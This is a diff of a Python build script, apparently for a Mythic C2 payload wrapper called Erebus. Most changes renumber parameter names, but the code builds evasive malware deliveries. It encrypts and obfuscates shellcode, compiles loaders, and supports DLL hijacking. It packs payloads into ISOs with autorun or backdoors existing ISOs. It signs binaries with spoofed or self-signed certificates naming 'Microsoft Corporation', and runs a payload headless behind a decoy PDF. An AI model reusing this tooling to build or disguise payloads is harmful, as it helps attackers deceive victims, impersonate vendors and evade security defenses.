@@ -122,7 +122,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             choices = ["ClickOnce", "Shellcode Loader"],
             default_value = "Shellcode Loader",
             hide_conditions = [
-                HideCondition(name="Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
             ]
         ),
 
@@ -133,9 +133,9 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             choices = ["EXE", "DLL"],
             default_value = "EXE",
             hide_conditions = [
-                HideCondition(name="Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
+                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
                 # Change this if you are using a custom Loader written in another language
-                HideCondition(name="Shellcode Format", operand=HideConditionOperand.NotEQ, value="Raw"),
+                HideCondition(name="2.4 Shellcode Format", operand=HideConditionOperand.NotEQ, value="Raw"),
             ]
         ),
         
@@ -146,9 +146,9 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             choices = ["debug", "release"],
             default_value = "debug",
             hide_conditions = [
-                HideCondition(name="Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
+                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
                 # Change this if you are using a custom shellcode retrieval method
-                HideCondition(name="Shellcode Format", operand=HideConditionOperand.NotEQ, value="Raw"),
+                HideCondition(name="2.4 Shellcode Format", operand=HideConditionOperand.NotEQ, value="Raw"),
             ]
         ),
 
@@ -159,7 +159,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             description = "Choose a command to run when the trigger is executed.",
             default_value = "C:\\Windows\\System32\\conhost.exe",
             hide_conditions = [
-                HideCondition(name="Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
             ]
         ),
 
@@ -169,7 +169,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             description = "Choose a command to run when the trigger is executed.",
             default_value = "--headless cmd.exe /Q /c payload.exe | decoy.pdf",
             hide_conditions = [
-                HideCondition(name="Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
             ]
         ),
 
@@ -179,7 +179,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             description = """Upload a decoy file (PDF/XLSX/etc.).
 If one is not uploaded then an example file will be used.""",
             hide_conditions = [
-                HideCondition(name="Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
             ]
         ),
 
@@ -191,9 +191,9 @@ NOTE: Shellcode Format must be set to C.
 NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded or compressed payloads.
 """,
             hide_conditions = [
-                HideCondition(name="Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                 # Change this if you are using a custom DLL Loader written in another language
-                HideCondition(name="Shellcode Format", operand=HideConditionOperand.NotEQ, value="C"),
+                HideCondition(name="2.4 Shellcode Format", operand=HideConditionOperand.NotEQ, value="C"),
             ]
         ),
 
@@ -276,7 +276,7 @@ generated if none have been entered.""",
             description = "Choose a name for the generated shellcode array. E.g. [array name] --> sh3llc0d3[113]...",
             default_value = "shellcode",
             hide_conditions = [
-                HideCondition(name="Shellcode Format", operand=HideConditionOperand.EQ, value="Raw")
+                HideCondition(name="2.4 Shellcode Format", operand=HideConditionOperand.EQ, value="Raw")
             ]
         ),
 
@@ -296,8 +296,8 @@ generated if none have been entered.""",
             choices=["0", "1", "3", "5", "7", "9"],
             default_value="9",
             hide_conditions = [
-                HideCondition(name="Shellcode Format", operand=HideConditionOperand.EQ, value="ISO"),
-                HideCondition(name="Shellcode Format", operand=HideConditionOperand.EQ, value="MSI"),
+                HideCondition(name="2.4 Shellcode Format", operand=HideConditionOperand.EQ, value="ISO"),
+                HideCondition(name="2.4 Shellcode Format", operand=HideConditionOperand.EQ, value="MSI"),
             ]
         ),
 
@@ -308,8 +308,8 @@ generated if none have been entered.""",
             default_value="",
             required=False,
             hide_conditions = [
-                HideCondition(name="Shellcode Format", operand=HideConditionOperand.EQ, value="ISO"),
-                HideCondition(name="Shellcode Format", operand=HideConditionOperand.EQ, value="MSI"),
+                HideCondition(name="2.4 Shellcode Format", operand=HideConditionOperand.EQ, value="ISO"),
+                HideCondition(name="2.4 Shellcode Format", operand=HideConditionOperand.EQ, value="MSI"),
             ]
         ),
 
@@ -321,7 +321,7 @@ generated if none have been entered.""",
             default_value="EREBUS",
             required=False,
             hide_conditions=[
-                HideCondition(name="Container Type", operand=HideConditionOperand.NotEQ, value="ISO")
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="ISO")
             ]
         ),
 
@@ -332,7 +332,7 @@ generated if none have been entered.""",
             default_value=False,
             required=False,
             hide_conditions=[
-                HideCondition(name="Container Type", operand=HideConditionOperand.NotEQ, value="ISO")
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="ISO")
             ]
         ),
 
@@ -342,78 +342,92 @@ generated if none have been entered.""",
             description="Backdoor an existing ISO",
             required=False,
             hide_conditions=[
-                HideCondition(name="Container Type", operand=HideConditionOperand.NotEQ, value="ISO")
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="ISO")
             ]
         ),
+        BuildParameter(
+            name="5.1 MSI Product Name",
+            parameter_type=BuildParameterType.String,
+            description="Application name shown in MSI/UI",
+            default_value="System Updater",
+            required=False,
+        ),
+        BuildParameter(
+            name="5.2 MSI Manufacturer",
+            parameter_type=BuildParameterType.String,
+            description="Company name shown in MSI metadata",
+            default_value="Microsoft Corporation",
+            required=False,
+        ),        
         #Codesigning
         BuildParameter(
-            name="Codesign Loader",
+            name="6.0 Codesign Loader",
             parameter_type=BuildParameterType.Boolean,
             description="Sign the loader with a codesigning cert",
             required=False,
         ),
 
         BuildParameter(
-            name="Codesign Type",
+            name="6.1 Codesign Type",
             parameter_type=BuildParameterType.ChooseOne,
             description="Backdoor an existing ISO",
             choices=["SelfSign", "Spoof URL", "Provide Certificate"],
             required=False,
             hide_conditions=[
-                HideCondition(name="Codesign Loader", operand=HideConditionOperand.EQ, value=False)
+                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value=False)
             ]
         ),
 
         BuildParameter(
-            name="Codesign CN",
+            name="6.2 Codesign CN",
             parameter_type=BuildParameterType.String,
             default_value="Microsoft Corporation",
             description="Common Name (CN) for self-signed cert",
             hide_conditions=[
-                HideCondition(name="Codesign Loader", operand=HideConditionOperand.EQ, value=False),
-                HideCondition(name="Codesign Type", operand=HideConditionOperand.NotEQ, value="SelfSign")
+                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value=False),
+                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="SelfSign")
             ]
         ),
 
         BuildParameter(
-            name="Codesign Orgname",
+            name="6.3 Codesign Orgname",
             parameter_type=BuildParameterType.String,
             default_value="Microsoft Corporation",
             description="Organisation Name for self-signed cert",
             hide_conditions=[
-                HideCondition(name="Codesign Loader", operand=HideConditionOperand.EQ, value=False),
-                HideCondition(name="Codesign Type", operand=HideConditionOperand.NotEQ, value="SelfSign")
+                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value=False),
+                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="SelfSign")
             ]
         ),
 
         BuildParameter(
-            name="Codesign Spoof URL",
+            name="6.4 Codesign Spoof URL",
             parameter_type=BuildParameterType.String,
             default_value="www.test.test",
             description="URL to clone certificate details from",
             hide_conditions=[
-                HideCondition(name="Codesign Loader", operand=HideConditionOperand.EQ, value="False"),
-                HideCondition(name="Codesign Type", operand=HideConditionOperand.NotEQ, value="Spoof URL")
+                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value="False"),
+                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="Spoof URL")
             ]
         ),
         
         BuildParameter(
-            name="Codesign Cert",
+            name="6.5 Codesign Cert",
             parameter_type=BuildParameterType.File,
             description="Upload PFX/P12 certificate",
             hide_conditions=[
-                HideCondition(name="Codesign Loader", operand=HideConditionOperand.EQ, value="False"),
-                HideCondition(name="Codesign Type", operand=HideConditionOperand.NotEQ, value="Provide Certificate")
+                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value="False"),
+                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="Provide Certificate")
             ]
         ),
         BuildParameter(
-            name="Codesign Cert Password",
+            name="6.6 Codesign Cert Password",
             parameter_type=BuildParameterType.String,
             default_value="",
             description="Certificate password (leave empty if none)",
             hide_conditions=[
-                HideCondition(name="Codesign Loader", operand=HideConditionOperand.EQ, value="False"),
-                HideCondition(name="Codesign Type", operand=HideConditionOperand.NotEQ, value="Provide Certificate")
+                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value="False"),
+                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="Provide Certificate")
             ]
         )
     ]
@@ -453,24 +467,24 @@ generated if none have been entered.""",
     async def containerise_payload(self):
         """Creates a container and adds all files generated from the payload function inside of the given archive/media"""
 
-        match(self.get_parameter("Container Type")):
+        match(self.get_parameter("3.0 Container Type")):
             case "7z":
                   return build_7z(
-                    compression=self.get_parameter("Compression Level"),
-                    password=self.get_parameter("Archive Password"),
+                    compression=self.get_parameter("3.1 Compression Level"),
+                    password=self.get_parameter("3.2 Archive Password"),
                     build_path=Path(self.agent_build_path)
                 )
 
             case "Zip":
                 return build_zip(
-                    compression=self.get_parameter("Compression Level"),
-                    password=self.get_parameter("Archive Password"),
+                    compression=self.get_parameter("3.1 Compression Level"),
+                    password=self.get_parameter("3.2 Archive Password"),
                     build_path=Path(self.agent_build_path)
                 )
 
             case "ISO":
                 source_iso_path = None
-                iso_uuid = self.get_parameter("ISO Backdoor File")
+                iso_uuid = self.get_parameter("4.2 ISO Backdoor File")
                 if iso_uuid:
                     file_resp = await SendMythicRPCFileGetContent(
                         MythicRPCFileGetContentMessage(AgentFileId=iso_uuid)
@@ -481,8 +495,8 @@ generated if none have been entered.""",
                 source_iso_path = temp_dir / filename
                 source_iso_path.write_bytes(file_resp.Content)
                 return build_iso(
-                                    volume_id=self.get_parameter("ISO Volume ID"),
-                                    enable_autorun = self.get_parameter("ISO enable Autorun"),
+                                    volume_id=self.get_parameter("4.0 ISO Volume ID"),
+                                    enable_autorun = self.get_parameter("4.1 ISO enable Autorun"),
                                     source_iso=source_iso_path,
                                     build_path=Path(self.agent_build_path)
                                 )
@@ -591,21 +605,21 @@ generated if none have been entered.""",
                 "python",
                 shellcrypt_path,
                 "-i", mythic_shellcode_path,
-                "-e", ENCRYPTION_METHODS[self.get_parameter("Encryption Type")],
-                "-f", SHELLCODE_FORMAT[self.get_parameter("Shellcode Format")],
+                "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
+                "-f", SHELLCODE_FORMAT[self.get_parameter("2.4 Shellcode Format")],
             ]
 
-            if self.get_parameter("Shellcode Format") != "Raw":
-                cmd += ["-a", self.get_parameter("Shellcode Array Name")]
+            if self.get_parameter("2.4 Shellcode Format") != "Raw":
+                cmd += ["-a", self.get_parameter("2.5 Shellcode Array Name")]
 
-            if self.get_parameter("Compression Type") != "NONE":
-                cmd += ["-c", COMPRESSION_METHODS[self.get_parameter("Compression Type")]]
+            if self.get_parameter("2.0 Compression Type") != "NONE":
+                cmd += ["-c", COMPRESSION_METHODS[self.get_parameter("2.0 Compression Type")]]
 
-            if self.get_parameter("Encoding Type") != "NONE":
-                cmd += ["-d", ENCODING_METHODS[self.get_parameter("Encoding Type")]]
+            if self.get_parameter("2.3 Encoding Type") != "NONE":
+                cmd += ["-d", ENCODING_METHODS[self.get_parameter("2.3 Encoding Type")]]
 
-            if self.get_parameter("Encryption Key") != "NONE":
-                cmd += ["-k", self.get_parameter("Encryption Key")]
+            if self.get_parameter("2.2 Encryption Key") != "NONE":
+                cmd += ["-k", self.get_parameter("2.2 Encryption Key")]
 
             cmd += ["-o", obfuscated_shellcode_path]
 
@@ -622,21 +636,21 @@ generated if none have been entered.""",
                 output += f"[stderr]\n{stderr.decode()}"
 
             if os.path.exists(obfuscated_shellcode_path):
-                if self.get_parameter("Shellcode Format") == "Raw":
+                if self.get_parameter("2.4 Shellcode Format") == "Raw":
                     # Get the encryption key in C format to be used within the loader and other functions
                     cmd = [
                         "python",
                         shellcrypt_path,
                         "-i", mythic_shellcode_path,
-                        "-e", ENCRYPTION_METHODS[self.get_parameter("Encryption Type")],
+                        "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
                         "-f",
                         "c",
                         "-a",
                         "shellcode"
                     ]
 
-                    if self.get_parameter("Encryption Key") != "NONE":
-                        cmd += ["-k", self.get_parameter("Encryption Key")]
+                    if self.get_parameter("2.2 Encryption Key") != "NONE":
+                        cmd += ["-k", self.get_parameter("2.2 Encryption Key")]
 
                     key_src = subprocess.check_output(cmd, text=True)
                     output += key_src
@@ -701,15 +715,15 @@ generated if none have been entered.""",
             ######################### End of Shellcode Obfuscation Section #########################
 
             ######################### DLL Hijacking Section #########################
-            if self.get_parameter("Main Payload Type") == "Hijack":
-                print(f'User Selected: {self.get_parameter("Main Payload Type")}')
+            if self.get_parameter("0.0 Main Payload Type") == "Hijack":
+                print(f'User Selected: {self.get_parameter("0.0 Main Payload Type")}')
 
                 file_content = await getFileFromMythic(
-                    agentFileId=self.get_parameter("DLL Hijacking")
+                    agentFileId=self.get_parameter("1.0 DLL Hijacking")
                 )
 
                 file_name_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
-                    AgentFileID=self.get_parameter("DLL Hijacking")
+                    AgentFileID=self.get_parameter("1.0 DLL Hijacking")
                 ))
 
                 dll_file_name = ""
@@ -828,8 +842,8 @@ generated if none have been entered.""",
             ######################### End Of DLL Hijacking Section #########################
 
             ######################### Shellcode Loader Section #########################
-            if self.get_parameter("Main Payload Type") == "Loader":
-                print(f'User Selected: {self.get_parameter("Main Payload Type")}')
+            if self.get_parameter("0.0 Main Payload Type") == "Loader":
+                print(f'User Selected: {self.get_parameter("0.0 Main Payload Type")}')
 
                 shutil.copy(dst=f"{shellcode_loader_path}/erebus.bin", src=obfuscated_shellcode_path)
 
@@ -872,7 +886,7 @@ generated if none have been entered.""",
                     "make",
                     "-C",
                     shellcode_loader_path,
-                    f"BUILD={self.get_parameter('Loader Build Configuration')}",
+                    f"BUILD={self.get_parameter('0.3 Loader Build Configuration')}",
                     "all"
                 ]
                 process = await asyncio.create_subprocess_exec(
@@ -921,19 +935,19 @@ generated if none have been entered.""",
             ######################### End Of Shellcode Loader Section #########################
 
             ######################### Code Signing Section #########################
-            if self.get_parameter("Codesign Loader"):
+            if self.get_parameter("6.0 Codesign Loader"):
                 try:
                     payload_path = Path(agent_build_path) / "payload" / "erebus.exe"
 
                     if not payload_path.exists():
                         raise FileNotFoundError(f"Payload not found for signing at: {payload_path}")
 
-                    signing_type = self.get_parameter("Codesign Type")
+                    signing_type = self.get_parameter("6.1 Codesign Type")
                     success_msg = ""
 
                     if signing_type == "SelfSign":
-                        cn = self.get_parameter("Codesign CN")
-                        org = self.get_parameter("Codesign Orgname") or cn
+                        cn = self.get_parameter("6.2 Codesign CN")
+                        org = self.get_parameter("6.3 Codesign Orgname") or cn
 
                         self_sign_payload(
                             payload_path=payload_path,
@@ -943,7 +957,7 @@ generated if none have been entered.""",
                         success_msg = f"Self-signed with CN: {cn}"
 
                     elif signing_type == "Spoof URL":
-                        target_url = self.get_parameter("Codesign Spoof URL")
+                        target_url = self.get_parameter("6.4 Codesign Spoof URL")
                         if not target_url:
                             raise ValueError("No URL provided for spoofing")
                         
@@ -957,8 +971,8 @@ generated if none have been entered.""",
                         success_msg = f"Spoofed {target_url} (CN: {cert_details['CN']})"
                     
                     elif signing_type == "Provide Certificate":
-                        cert_uuid = self.get_parameter("Codesign Cert")
-                        cert_pass = self.get_parameter("Codesign Cert Password")
+                        cert_uuid = self.get_parameter("6.5 Codesign Cert")
+                        cert_pass = self.get_parameter("6.6 Codesign Cert Password")
                         
                         if not cert_uuid:
                             raise ValueError("No certificate file uploaded")
@@ -1026,7 +1040,7 @@ generated if none have been entered.""",
                 with open(container_path, "rb") as f:
                     response.payload = f.read()
 
-                container = self.get_parameter("Container Type")
+                container = self.get_parameter("3.0 Container Type")
                 match container:
                     case "7z":
                         ext = "7z"
